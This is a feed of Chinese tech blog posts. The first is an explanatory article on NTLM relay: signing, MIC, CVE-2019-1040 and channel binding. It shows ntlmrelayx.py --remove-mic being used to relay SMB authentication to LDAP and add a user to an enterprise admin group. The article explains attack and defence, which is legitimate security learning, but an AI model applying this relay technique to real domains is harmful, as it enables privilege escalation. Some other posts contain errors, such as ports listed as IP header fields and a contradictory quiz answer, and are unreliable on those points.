Negotiated Signing:此选项表示协商签名，如果与他通信的机器也协商签名，那么数据包就会被签名。
必须签名:这代表不仅支持签名，而且必须对数据包进行签名才能使会话继续。
在域控中Ldap签名是在HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NTDS\Parameters/注册表中的ldapserverintegrity选项，他的值可以为0，1，2分别代表着Ldap签名的级别。默认他的值为1。
那么对于客户端来说，Ldap签名设置是在HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ldap注册表中。他的默认值也是1。
所以说服务端协商签名，客户端也协商签名，所以，所有的Ldap数据包都会被签名。(这里说的是Ldap的级别1)
那么如果一方需要签名，而另一方不支持签名，那么需要签名的一方会忽略未签名的数据包。(这里说的是Ldap级别2)
那么如果我们需要使用Ldap将身份验证中继到服务器，那么必须满足两个要求。
服务端不能设置为需要签名，也就是Ldap的级别为2，默认情况下所有的机器都是协商签名，而不是必须签名。
客户端不能设置NEGOTIATE_SIGN(SMB签名)为1，如果设置了那么客户端就希望签名，因为攻击者不知道客户端的密钥，所以就无法签署数据包。
关于第二点，那么客户端如果不设置此标记的话，那么是不是就可以中继了呢？Windows SMB客户端设置了它，默认情况下，我们无法将SMB身份验证中继到LDAP。
MIC签名
这里目前有一个环境，就是说我这台1.2机器上也就是服务端不仅支持签名而且需要签名，那么攻击者就无法通过SMB进行中继。
如下图:
我们使用ntlmrelay.py进行中继。可以看到是无法中继的。
所以我们在想，既然不能中继到SMB协议上，那么能不能中继到其他协议？比如Ldaps协议。
Ldaps对应的端口是636。
我们都知道NEGOTIATE_SIGN标记是用于客户端和服务端是否支持签名的，但是在某些情况下，LDAP/LDAPS会考虑这个标记。
对于LDAPS来说，服务端也会考虑这个标志，如果服务端看到客户端的NEGOTIATE_SIGN标记设置为1，那么服务端直接拒绝身份验证，这是因为LDAPS也是基于TLS的LDAP，他是会处理数据包签名的TLS层。
那么现在来说我们中继的客户端需要通过SMB进行身份验证，但是它支持数据包签名，它将NEGOTIATE_SIGN标志设置为了1，但是如果我们通过LDAPS来中继身份验证，但是LDAPS服务端也会看到这个标记，并且终止身份验证。
也就是说无论是SMB还是LDAP/LDAPS，看到这个NEGOTIATE_SIGN标记位设置为了1，那么就会终止会话，因为攻击者无法对数据包签名，攻击者不知道客户端的密钥。
那么我们能不能将这个标记给它干掉呢？就比如说给他删掉，这鸟标记太烦人了。
但是这个标记我们干不掉，因为在它的上面还有一个NTLM级别的签名，那么就是MIC签名。
MIC签名是如下计算的。
HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE)
最重要的是会话密钥是用客户端的密钥进行加密的，所以攻击者无法计算MIC值。
所以说啊，如果把将NTLM消息这部分改了，那么MIC就不会生效了，所以我们无法更改NEGOTIATE_SIGN标记。
那么我们能不能将MIC给它干掉呢？这是可以的，因为MIC是可选的。
那么它通过什么来可选的呢？
它是通过
msAvFlags
值来进行可选的，如果他的值为
0x00000002
那么它就会告诉服务器必须存在MIC，如果不存在的话，就会直接终止身份验证。
那么如果我们将msAvFlags的值设置为0，然后移除MIC，是不是可以呢？
这样是不行的，因为当客户端请求服务端质询的时候，服务端返回NTLMV2 Hash，这个Hash它不仅仅考虑了质询，而且还考虑了所有标志的HASH，所以说MIC存在的标志也是响应的一部分。
也就是说更改或者删除MIC标记会使NTLMV2Hash无效。因为数据被修改之后它是这样子的。
MIC保护了协商，质询，认证这三条消息的完整性，而msAvFlags保护的是MIC的存在，NTLMv2 哈希保护标志的存在，因为攻击者不知道客户端的密钥，所以不能计算这个Hash值。
所以这种情况下我们是不能攻击的。
但是老外发现了一个相关的漏洞，CVE-2019-1040，它可以绕过NTLM MIC（消息完整性检查）保护。
已经集成到了ntlmrelayx.py --remove-mic
我们来使用一下:
可以看到这里成功将user4用户添加到企业管理组里面了，这里是通过SMB协议进行触发的，中继到了Ldap协议。这里中继的是ldap，ldaps也是可以的，这里的ip是210，因为只有域控有Ldap服务。
如下图可以看到user4已经是企业管理组的成员了。
CVE-2019-1040的漏洞范围是:
Windows 7 sp1 至Windows 10 1903
Windows Server 2008 至Windows Server 2019
那么你如果使用Ldaps去中继的时候会出现这样的问题。
这是因为你没有安装证书服务导致的，所以在AD控制面板哪里添加功能，选择证书服务。
如下图: 可以百度搜索安装ADCS证书服务。 这里可以参考:https://lework.github.io/2019/07/24/ad-install/#%E5%90%AF%E7%94%A8ldaps
之后我们使用LDP.exe连接Ldaps服务。
记得勾选上SSL即可。
紧接着我们再来Ldaps中继，可以发现成功了。
通道绑定
那么通道绑定是干什么的呢？就如我们上面看到的，我们可以通过跨协议中继，通道绑定就是为了解决这个问题。
其实就是将身份验证和正在使用的协议绑定在一起，攻击者就无法修改，如果客户端希望对服务器进行身份验证以及使用特定的服务，例如cifs等等，则将该标识性的信息添加到NTLM响应中，由于服务名称在NTLM响应中，所以因此它受到
NtProofStr
响应的保护，该响应是此信息以及其实和MIC计算的那个msAvFlags值是差不多的，都是使用客户端的密钥进行计算的。
就比如说客户端去请求服务端，客户端已经在他的NTLM响应中指明了他要访问的服务，并且由于攻击者无法修改它，当攻击者将请求中继给服务端的时候，将攻击者请求的SMB服务，和 NTLM响应中的HTTP服务进行对比，发现是不同的服务，所以直接拒绝连接。
如下图,客户端在NTLM响应中加了要访问的服务，攻击者如果中继给服务端是其他服务的话，那么服务端就会直接拒绝连接。
具体来说所谓服务其实就是SPN，之前的文档里面讲过。
可以看到它使用的是CIFS服务，也就是SMB协议，，不仅有服务名称 (CIFS)，还有目标名称或 IP 地址。这意味着如果攻击者将此消息中继到服务器，服务器也会检查目标部分，并会拒绝连接，因为在 SPN 中找到的 IP 地址与他的 IP 地址不匹配。因此，如果所有客户端和所有服务器都支持这种保护，并且每台服务器都需要这种保护，那么它可以减少所有中继尝试。
那么怎么设置呢？？？
默认win2012是没有这个东西，网上资料显示是win10才新加的策略。
参考:https://learn.microsoft.com/zh-cn/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-channel-binding-token-requirements
那些协议可以中继
NEGOTIATE_SIGN如果不需要签名，则任何未设置标记的客户端都可以中继到Ldap。
NTLMV1的危害
在NTLMV2中，NTLMV2哈希考虑了msAvFlags标记位，MIC字段，还有NetBios名称的字段等等，但是NTLMV2的哈希是没有任何附加信息的，例如没有MIC，目标名称,SPN等等。因此如果服务端允许NTLMV1身份验证的话，攻击者可以直接移除MIC字段，从而将身份验证中继到Ldap或Ldaps。
但更重要的是，他可以发出 NetLogon 请求以检索会话密钥。确实，域控制器没有办法检查他是否有权这样做。而且由于它不会阻止不是完全最新的生产网络，它会出于“复古兼容性原因”将其提供给攻击者。
这一点可以在ZeroLogon这个漏洞中进行体现。
总结
SMB V1中继到SMBV1 服务端如果没有设置签名，也就是RequireSecuritySignature和EnableSecuritySignature这两个值。那么就可以中继成功，无论客户端是否支持签名还是需要签名，是可以中继成功的。
SMBV2默认需要签名。
跨协议中继,SMBV2中继到Ldap服务，这是利用了CVE-2019-1040这个漏洞，这个漏洞可以绕过MIC签名。
SMBV2中继到Ldaps服务，需要安装ADCS证书服务。
通道绑定可以解决跨协议中继的问题，将服务的标识放在了NTLM响应中，从而和服务端的服务进行对比。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540145.html</guid><pubDate>Fri, 31 Oct 2025 07:25:56 +0000</pubDate></item><item><title>软件开发----设计模式每日刷题（转载于牛客）</title><link>https://www.ppmy.cn/news/1540146.html</link><description>1.        以下哪些问题通过应用设计模式不能够解决（）
A
指定对象的接口
B
针对接口编程
C
确定软件的功能都正确实现
D
设计应支持变化
正确答案：C
2.        下面不属于创建型模式的有（）
A
抽象工厂模式（ Abstract Factory ）
B
工厂方法模式（Factory Method）
C
适配器模式 （Adapter）
D
单例模式（Singleton）
正确答案：C
解析：
设计模式分为三种类型：
（1）创建型模式：单例模式、抽象工厂模式、建造者模式、工厂模式、原型模式。
（2）结构型模式：适配器模式、桥接模式、装饰模式、组合模式、外观模式、享元模式、代理模式。
（3）行为型模式：模版方法模式、命令模式、迭代器模式、观察者模式、中介者模式、备忘录模式、解释器模式、状态模式、策略模式、职责链模式、访问者模式。
3.        设计模式一般用来解决什么样的问题（）
A
同一问题的不同表相
B
不同问题的同一表相
C
不同问题的不同表相
D
其他都不是
正确答案：A
解析：
设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。是用来解决重复利用的解决方案，可以对之后的问题进行简单的修改、降低成本来进行使用，设计模式要为了使设计适应变化，并且要保持流畅、简单和持续性。
4.设计模式在实际程序设计过程中应用很广泛，例如微软著名的MFC框架就广泛的使用了模板模式，而浏览器、office等插件开发基本上都使用了策略模式，下面关于模板模式和策略模式说明错误的是（  ）。
A
策略模式和模板模式在某些应用场景下可以互换。
B
模板模式使用的是继承关系实现，策略模式使用的是组合关系实现。
C
模板模式倾向于把解决问题过程定义为一个完整框架，把过程中的若干实现步骤延迟到子类中实现。
D
策略模式倾向于把解决问题的算法定义为一个接口，把解决问题的具体过程通过继承的方式封装起来
正确答案：D
解析：
策略模式和模板模式的联系与区别
策略模式和模板模式在某些应用场景下可以互换。
模板模式使用的是继承关系实现，策略模式使用的是组合关系实现。
模板模式倾向于把解决问题过程定义为一个完整框架，把过程中的若干实现步骤延迟到子类中实现。
5.        行为类模式使用( )在类间分派行为。
A
接口
B
继承机制
C
对象组合
D
委托
正确答案：B
解析：
行为型模式用于描述程序在运行时复杂的流程控制，即描述多个类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，它涉及算法与对象间职责的分配。 行为型模式分为类行为模式和对象行为模式，前者采用继承机制来在类间分派行为，后者采用组合或聚合在对象间分配行为。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象行为模式比类行为模式具有更大的灵活性。
6.        在现实生活中，居民身份证号码具有唯一性，居民可以申请身份证号码或补办身份证号码（还是使用原来的身份证号码，不会产生新的号码）。我们可以使用（）来模拟实现居民身份证号码办理。
A
命令模式
B
桥接
C
单例模式
D
责任链
正确答案：C
7.        Open-Close原则的含义是一个软件实体( )
A
应当对扩展开放，对修改关闭.
B
应当对修改开放，对扩展关闭
C
应当对继承开放，对修改关闭
D
其他都不对
正确答案：A
解析：
open-close原则：在不修改源代码情况下即可完成对系统的扩展
8.        现在大多数软件都有撤销(Undo)的功能，快捷键一般都是Ctrl+Z。这些软件可能使用了（）模式来进行。
A
备忘录模式
B
访问者模式
C
模板方法模式
D
责任链
正确答案：A
解析：
备忘录模式(Memento pattern): 当你需要让对象返回之前的状态时(例如, 你的用户请求"撤销"), 你使用备忘录模式
访问者模式(visitor pattern): 当你想要为一个对象的组合增加新的能力, 且封装并不重要时, 就使用访问者模式
模板方法模式(Template pattern): 在一个方法中定义一个算法的骨架, 而将一些步骤延迟到子类中. 模板方法使得子类可以在不改变算法结构的情况下, 重新定义算法中的某些步骤
责任链模式(Chain of responsibility pattern): 通过责任链模式, 你可以为某个请求创建一个对象链. 每个对象依序检查此请求并对其进行处理或者将它传给链中的下一个对象
9.        某高校奖励审批系统可以实现教师奖励和学生奖励的审批(AwardCheck)，如果教师发表论文数超过10篇或者学生论文超过2篇可以评选科研奖，如果教师教学反馈分大于等于90分或者学生平均成绩大于等于90分可以评选成绩优秀奖。奖励审批系统可以使用（）设计该系统，以判断候选人集合中的教师或学生是否符合某种获奖要求
。
A
工厂方法模式
B
访问者模式
C
模板方法模式
D
责任链
正确答案：B
解析：
对同一对象结构中的元素的操作方式并不唯一，可能需要提供多种不同的处理方式，还有可能增加新的处理方式。
对象：科研奖、成绩优秀奖
访问者：学生、教师
不同访问者访问对象时有不同的操作方式
10.        下面关于“单例模式”错误的是（）
A
它可以保证某个类在程序运行过程中最多只有一个实例，也就是对象实例只占用一份内存资源。
B
使用单例，可以确保其它类只获取类的一份数据。
C
对于一些不需要频繁创建和销毁的对象，单例模式可以提高系统的性能。
D
由于单例模式中没有抽象层，因此单例很难进行类的扩展。
正确答案：C
解析：
单例模式：
对于一些需要频繁创建和销毁的对象，单例模式可以提高系统性能。
只需要创建一个实例即可，无需重复创建，占用系统内存资源。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540146.html</guid><pubDate>Fri, 31 Oct 2025 07:25:58 +0000</pubDate></item><item><title>牛客周赛 Round 62：小红的中位数查询easy：巧用stl模拟</title><link>https://www.ppmy.cn/news/1540147.html</link><description>链接：登录—专业IT笔试面试备考平台_牛客网
来源：牛客网
题目描述
easy 版本中，所有的
r−l+1r - l + 1r−l+1
都相等，而 hard 版本中没有此限制。通过 easy 版本可以获得 250 分，通过 hard 版本可以获得 50 分。
小红拿到了一个数组，她有若干次询问，每次询问一个区间，她希望你输出该区间的中位数是多少。
保证区间的元素数量为奇数。
在本难度中，保证所有区间的长度都相等。
区间中位数的定义：将区间所有元素从小到大排序后、最中间的那个数。例如[2,1,4]的中位数是2，[2,1,4,3,3]的中位数是3。
输入描述:
第一行输入两个正整数n,qn,qn,q，代表数组大小、询问次数。
第二行输入nnn个正整数aia_iai​，代表小红拿到的数组。
接下来的qqq行，每行输入两个正整数li,ril_i,r_ili​,ri​，代表一次询问。
1≤n,q≤1051\leq n,q \leq 10^51≤n,q≤105
1≤ai≤1091\leq a_i \leq 10^91≤ai​≤109
1≤li≤ri≤n1\leq l_i \leq r_i \leq n1≤li​≤ri​≤n
保证所有的ri−li+1r_i-l_i+1ri​−li​+1为奇数，且都相等。
输出描述:
输出qqq行，每行输出一个正整数，代表询问的结果。
示例1
输入
复制5 2 2 1 4 3 3 1 3 2 4
5 2
2 1 4 3 3
1 3
2 4
输出
复制2 3
2
3
#include&lt;bits/stdc++.h&gt;
using namespace std;
const int N=1e5+10;
int n,q,a[N],ans[N];
vector&lt;int&gt; v;
pair&lt;int,int&gt; p[N];
int main(){cin.tie(0);ios::sync_with_stdio(0);cin&gt;&gt;n&gt;&gt;q;for(int i=1;i&lt;=n;i++) cin&gt;&gt;a[i];for(int i=1;i&lt;=q;i++) cin&gt;&gt;p[i].first&gt;&gt;p[i].second;int len=p[1].second-p[1].first+1;for(int i=1;i&lt;=n;i++){v.insert(lower_bound(v.begin(),v.end(),a[i]),a[i]);//保证了长度为len的区间是有序的，从而取中间值求平均数if(v.size()==len){int id=len/2;ans[i]=v[id];v.erase(lower_bound(v.begin(),v.end(),a[i-len+1]));}}for(int i=1;i&lt;=q;i++){cout&lt;&lt;ans[p[i].second]&lt;&lt;endl;}
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540147.html</guid><pubDate>Fri, 31 Oct 2025 07:26:00 +0000</pubDate></item><item><title>【计算机网络 - 基础问题】每日 3 题（三十六）</title><link>https://www.ppmy.cn/news/1540148.html</link><description>✍个人博客：https://blog.csdn.net/Newin2020?type=blog
📣专栏地址：http://t.csdnimg.cn/fYaBd
📚专栏简介：在这个专栏中，我将会分享 C++ 面试中常见的面试题给大家~
❤️如果有收获的话，欢迎点赞👍收藏📁，您的支持就是我创作的最大动力💪
📝推荐参考地址：https://www.xiaolincoding.com/（这个大佬的专栏非常有用！）
106. 腾讯会议设计原理是什么，讲解一下大概流程比如是用的 UDP 还是 TCP，文件描述符这类讲解怎么实现的会议？
腾讯会议是一款基于 TCP 协议和 WebRTC 技术的视频会议产品，主要流程如下：
用户通过客户端发起加入会议请求。
客户端向服务器发送加入会议请求，服务器接收到后返回一个会议 ID 和一组用户信息。
客户端根据会议 ID 和用户信息通过 WebRTC 技术建立与服务器的连接。
服务器将该用户加入到指定的视频房间中，同时将该房间内其他成员的信息发送给新进入的成员。
成员之间通过 WebRTC 技术建立点对点通信，进行音视频数据传输。在传输过程中，使用 UDP 协议传输音视频数据包，并且采用 SRTP（安全实时传输协议）对数据进行加密和认证。
在整个过程中，客户端需要不断监听各种事件（例如：网络状态变化、硬件设备变更等），并根据事件类型做出相应处理。
为了保证音视频质量，在每个参会者电脑上运行一个音频引擎来提供噪声抑制、回声消除、自动增益控制等功能。
文件描述符方面，可以使用 epoll 或者 select 来监听多个 socket 文件描述符，并且能够高效地处理 I/O 事件。另外，在 WebRTC 中也有使用 IOCP 模型来处理网络 I/O 事件。
总的来说，腾讯会议通过 WebRTC 技术实现音视频传输，使用 TCP 协议建立与服务器的连接，并采用 UDP 协议传输音视频数据包。同时，客户端需要不断监听各种事件，并且可以使用 epoll 或者 select 等方法处理多个文件描述符的 I/O 事件。
107. IP 分类以及其优缺点
IP 分类的优点
不管是路由器还是主机解析到一个 IP 地址时候，我们判断其 IP 地址的首位是否为 0，为 0 则为 A 类地址，那么就能很快的找出网络地址和主机地址。
IP 分类的缺点
缺点一
同一网络下没有地址层次，比如一个公司里用了 B 类地址，但是可能需要根据生产环境、测试环境、开发环境来划分地址层次，而这种 IP 分类是没有地址层次划分的功能，所以这就缺少地址的灵活性。
缺点二
A、B、C 类有个尴尬处境，就是不能很好的与现实网络匹配。
C 类地址能包含的最大主机数量实在太少了，只有 254 个，估计一个网吧都不够用。
而 B 类地址能包含的最大主机数量又太多了，6 万多台机器放在一个网络下面，一般的企业基本达不到这个规模，闲着的地址就是浪费。
这两个缺点，都可以在 CIDR 无分类地址解决。
108. 列举 IP 报文头部
源地址（Source Address）：指定了 IP 报文的发送者的 IP 地址。它用来标识发送方的身份和位置。
目标地址（Destination Address）：指定了 IP 报文的接收者的 IP 地址。它用来指定报文的目的地。
生存时间（Time to Live，TTL）：TTL 字段用于控制 IP 报文在网络中的生存时间。它指示了一个报文在网络中可以经过的最大路由器跳数。每经过一个路由器，TTL 值会减少 1。如果 TTL 值减少到 0，路由器会丢弃该报文，同时发送一个 ICMP（Internet Control Message Protocol）超时消息给报文的源地址。
此外，IP 报文头部还包含其他字段，如版本号、报文长度、协议类型、源端口、目标端口等。这些字段用于在网络中正确地路由和传输数据。
需要注意的是，上述列举的字段是 IPv4 协议的报文头部。在 IPv6 协议中，报文头部的字段可能会有所不同。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540148.html</guid><pubDate>Fri, 31 Oct 2025 07:26:03 +0000</pubDate></item><item><title>ifconfig 和 ip addr</title><link>https://www.ppmy.cn/news/1540149.html</link><description>1.
工具所属套件
ifconfig
：属于较老的
net-tools
套件。曾是 Unix 和 Linux 系统上广泛使用的工具。
ip addr
：属于较新的
iproute2
套件。它取代了
ifconfig
，并逐渐成为现代 Linux 系统上更常用的工具。
2.
功能覆盖范围
ifconfig
：主要用于配置和查看网络接口的 IP 地址、子网掩码、广播地址等。它的功能相对单一，专注于基础的网络配置。
ip addr
：功能更加丰富，除了查看和配置 IP 地址之外，还可以管理路由、流量控制、链路管理、VLAN 配置等，提供了更为全面的网络管理功能。
3.
显示的信息
ifconfig
：显示的网络信息较为简洁，通常包括网络接口的 IP 地址、掩码、广播地址、状态（up/down）、MTU、硬件地址等。
ip addr
：提供更详细的信息，包括更多的接口状态信息、链路层信息（如 MAC 地址、IPv6 地址）、多播信息等。
4.
IPv6 支持
ifconfig
：对 IPv6 的支持相对较弱，主要是因为
ifconfig
诞生较早，设计时并未充分考虑 IPv6。
ip addr
：对 IPv6 提供了更全面的支持，可以方便地配置和查看 IPv6 地址。
5.
使用场景
ifconfig
：由于它是老旧工具，在新版本的 Linux 发行版中可能已经被弃用或不推荐使用。
ip addr
：作为
iproute2
套件的一部分，提供了更丰富的网络管理功能，是现代 Linux 系统中推荐使用的工具。
总结：
ifconfig
：较旧，功能单一，显示信息简洁，不再推荐使用。
ip addr
：功能全面，支持 IPv6 和更复杂的网络配置，适合现代系统。
在现代 Linux 系统中，推荐使用
ip addr
而不是
ifconfig
。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540149.html</guid><pubDate>Fri, 31 Oct 2025 07:26:06 +0000</pubDate></item><item><title>2024最新版Windows平台VSCode通过Cmake开发Qt项目</title><link>https://www.ppmy.cn/news/1540150.html</link><description>VSCode配合Cmake可以非常有效的开发Qt项目，因为它提供的Qt插件和Cmake插件具有较好的集成性。
(本博客使用的是Qt6和Cmake3)。
首先创建一个空的文件夹。
将下面的插件都安装好
接着ctrl+shift+p，选择QConfigure:New Project。
指定项目名称
选择Qt的工具链，这里必须使用Qt自带的mingw或者msvc等编译器，不能使用自己安装的mingw或者msvc编译器。
不然后面cmake编译的时候会报错提示：
cannot find -ld3d12
因为自己的mingw找不到这个库，Qt的mingw有找到这个库的功能，这个库是windows自带的一个库，基本windows系统都具备，但不一定找得到。
构建工具使用Cmake
把UI文件带上
接着就得到了源码文件了。
由于VSCode插件生成的Cmake文件是针对Qt5的，所以对于Qt6我们需要进行一定的更改。
将多余的代码去掉，并将模块改为Qt6。
cmake_minimum_required(VERSION 3.5)
project(qttest2 LANGUAGES CXX)
set(CMAKE_INCLUDE_CURRENT_DIR ON)
set(CMAKE_PREFIX_PATH "d:/c.app/QT6/6.6.2/mingw_64")
set(CMAKE_AUTOUIC ON)
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
find_package(Qt6 COMPONENTS Widgets REQUIRED)
aux_source_directory(./src srcs)
add_executable(${PROJECT_NAME}${srcs} 
) 
target_link_libraries(${PROJECT_NAME} PRIVATE Qt6::Widgets)
再次ctrl+shift+p，点击Cmake配置
这里的工具链一定要选择QT自带的。
如果没有显示出来，那你就点击扫描工具包，可以扫描出来，当然前提是你配置了PATH环境变量，这个安装Qt的时候一般都会告诉你配置。
选择完工具链之后就开始构建了。
发现我们的目录多出了build目录，这时候我们就可以将.vscode删掉了，因为.vscode是VSCode自带的C++项目构建工具，但是我们已经有CMake来构建了，所以就不需要了。
你的build目录和我的build目录里面的文件可能是不一样的，因为我用的Cmake生成器是Ninja，所以产生的是build.ninja，ninja就是通过build.ninja产生可执行文件的，你的可能是MSVC所以可能会产生.sln文件，或者你是使用最原始的Makefile生成器，那么产生的就是Makefile文件。
接着打开终端
进入到build目录中，输入Ninja -C ./
代表在当前目录，也就是build目录产生可执行文件。
接着直接执行可执行文件就可以了，.\qttest2.exe。
至此VSCode配置Qt开发就完成了，我比较喜欢这种构建方式，因为这种方式可以完全掌控项目的文件组成，不想QtCreator将项目封装起来了，你都不知道怎么分包编译.cpp文件，如果我想要将.ui文件放到view文件夹下面，.cpp文件放到src文件夹下面，所有.h文件放到include文件夹下面，这时候Cmake构建这种项目就特别清晰了。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540150.html</guid><pubDate>Fri, 31 Oct 2025 07:26:09 +0000</pubDate></item><item><title>ELK:Elasticsearch、Logstash、Kibana Spring Cloud Sleuth和Spring Cloud Zipkin</title><link>https://www.ppmy.cn/news/1540151.html</link><description>〇、虚拟机中docker安装elasticsearch 、Kibana、Logstash
elasticsearch导入中文分词器
Logstash修改es数据库ip及创建索引名配置
一、elasticsearch数据库的结构
和mysql作比较，mysql中的数据库的二维表相当于es数据库的index索引结构；mysql数据库的二维表中每一条数据相当于es数据库中的document文档数据。
每个索引有主分片和副分片，主分片和副分片数据保持一致，类似主从关系。
index索引有不同于二维表的mappings数据结构:
document文档数据存放在hits中的hits中
二、使用Kibana图形化界面命令操作es数据库
1）查看索引、创建索引及mappings结构、创建文档数据
1）查询所有索引
2）查看指定索引goods
3）创建索引并更改mapping结构
4）创建索引文档
5）其他命令
2）对文档数据的crud操作
3）检索操作
三、使用java代码连接操作es数据库
0）导入依赖坐标
&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.3.12.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;&lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;&lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt;&lt;/dependencies&gt;
1）创建实体类、并添加注解
@Field：
添加该注解类似于redis的json数据和实体类对象的属性映射时添加的注解，name用来指定映射到es数据库中的字段名称，type用来指定映射到es数据库中的类型，analyzer用来指定分词器，es数据库没有中文分词器，需要自行下载。
@Document：
indexName指定创建index索引时的索引名
2）添加相关配置文件
别忘记编写启动类
3） 在测试类中调用es数据库连接对象elasticsearchRestTemplate
①创建索引
②增
③改
④删
⑤全字段内容检索
⑥全部搜索
⑦匹配搜索
⑧短语搜索
⑨范围搜索
⑩多条件搜索
⑩①搜索高亮
四、使用Logstash收集日志数据到es数据库中
0）依赖坐标
&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.3.12.RELEASE&lt;/version&gt;
&lt;/parent&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;net.logstash.logback&lt;/groupId&gt;&lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt;&lt;version&gt;6.3&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;&lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt;
&lt;/dependencies&gt;
1）编写logback.xml文件
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!--该日志将日志级别不同的log信息保存到不同的文件中 --&gt;
&lt;configuration&gt;
&lt;include resource="org/springframework/boot/logging/logback/defaults.xml" /&gt;
&lt;springProperty scope="context" name="springAppName"
source="spring.application.name" /&gt;
&lt;!-- 日志在工程中的输出位置 --&gt;
&lt;property name="LOG_FILE" value="${BUILD_FOLDER:-build}/${springAppName}" /&gt;
&lt;!-- 控制台的日志输出样式 --&gt;
&lt;property name="CONSOLE_LOG_PATTERN"
value="%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}" /&gt;
&lt;!-- 控制台输出 --&gt;
&lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt;
&lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt;
&lt;level&gt;INFO&lt;/level&gt;
&lt;/filter&gt;
&lt;!-- 日志输出编码 --&gt;
&lt;encoder&gt;
&lt;pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/pattern&gt;
&lt;charset&gt;utf8&lt;/charset&gt;
&lt;/encoder&gt;
&lt;/appender&gt;
&lt;!-- logstash远程日志配置--&gt;
&lt;appender name="logstash" class="net.logstash.logback.appender.LogstashTcpSocketAppender"&gt;
&lt;destination&gt;192.168.8.128:4560&lt;/destination&gt;
&lt;encoder charset="UTF-8" class="net.logstash.logback.encoder.LogstashEncoder" /&gt;
&lt;/appender&gt;
&lt;!-- 日志输出级别 --&gt;
&lt;root level="DEBUG"&gt;
&lt;appender-ref ref="console" /&gt;
&lt;appender-ref ref="logstash" /&gt;
&lt;/root&gt;
&lt;/configuration&gt;
2）添加日志注解
3)kibana查看日志索引文档信息
①）命令查看
②）图形化界面
五、Spring Cloud Sleuth
Sleuth是在logback的基础上进行请求追踪和日志记录，会标记请求添加一个id。
0）依赖坐标
&lt;!-- sleuth启动器依赖 --&gt;
&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-sleuth&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!-- logstash相关依赖，用于应用中的Sleuth将采集的跟踪数据发送给logstash使用 --&gt;
&lt;dependency&gt;&lt;groupId&gt;net.logstash.logback&lt;/groupId&gt;&lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt;&lt;version&gt;5.0&lt;/version&gt;
&lt;/dependency&gt;
1）修改logback.xml配置文件&lt;encoder&gt;标签
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!--该日志将日志级别不同的log信息保存到不同的文件中 --&gt;
&lt;configuration&gt;&lt;include resource="org/springframework/boot/logging/logback/defaults.xml" /&gt;&lt;springProperty scope="context" name="springAppName"source="spring.application.name" /&gt;&lt;!-- 日志在工程中的输出位置 --&gt;&lt;property name="LOG_FILE" value="${BUILD_FOLDER:-build}/${springAppName}" /&gt;&lt;!-- 控制台的日志输出样式 --&gt;&lt;property name="CONSOLE_LOG_PATTERN"value="%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}" /&gt;&lt;!-- 控制台输出 --&gt;&lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt;&lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt;&lt;level&gt;INFO&lt;/level&gt;&lt;/filter&gt;&lt;!-- 日志输出编码 